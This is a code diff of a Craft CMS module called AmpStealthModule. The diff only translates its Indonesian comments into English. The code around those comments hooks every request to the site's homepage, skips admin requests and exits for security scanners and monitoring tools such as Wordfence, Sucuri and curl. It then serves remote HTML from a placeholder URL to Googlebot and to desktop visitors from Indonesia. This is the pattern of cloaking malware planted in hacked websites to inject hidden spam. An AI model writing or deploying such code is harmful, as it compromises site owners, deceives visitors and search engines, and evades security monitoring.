@@ -11,7 +11,7 @@ class AmpStealthModule extends Module
     {
         parent::init();
 
-        // Hook sebelum request diproses
+        // Hook before the request is processed
         Craft::$app->on(WebApplication::EVENT_BEFORE_REQUEST, function () {
             $this->handleCloaking();
         });
@@ -21,17 +21,17 @@ class AmpStealthModule extends Module
     {
         $request = Craft::$app->getRequest();
 
-        // Hanya homepage (root path)
+        //// Only homepage (root path)
         if (trim($request->getPathInfo(), '/') !== '') {
             return;
         }
 
-        // Abaikan CP dan admin
+        // Ignore CP and admin
         if ($request->getIsCpRequest()) {
             return;
         }
 
-        // Proteksi terhadap user-agent bot WAF
+        // Protection against WAF user-agent bots
         $userAgent = strtolower($request->getUserAgent() ?? '');
         $blockUAs = ['wordfence', 'sucuri', 'curl', 'wget', 'scanner', 'uptime', 'monitor', 'headless', 'python', 'pingdom'];
 
@@ -41,7 +41,7 @@ class AmpStealthModule extends Module
             }
         }
 
-        // Proteksi terhadap referrer atau URL mencurigakan
+        // Protection against suspicious referrers or URLs
         $referer = strtolower($request->getReferrer() ?? '');
         $badPaths = ['/admin', '/login', '/xmlrpc.php', '/wp-json', '/feed', '/?rest_route='];
 
@@ -55,7 +55,7 @@ class AmpStealthModule extends Module
         $isMobile = preg_match('/mobile|android|iphone|ipad/i', $userAgent);
         $country = $this->getVisitorCountry();
 
-        // URL konten remote (desktop AMP HTML langsung)
+        // Remote content URL (live AMP HTML desktop)
         $remoteUrl = '#HTTPS://LP.TXT#';
 
         if ($isGoogleBot || (strtolower($country) === 'indonesia' && !$isMobile)) {
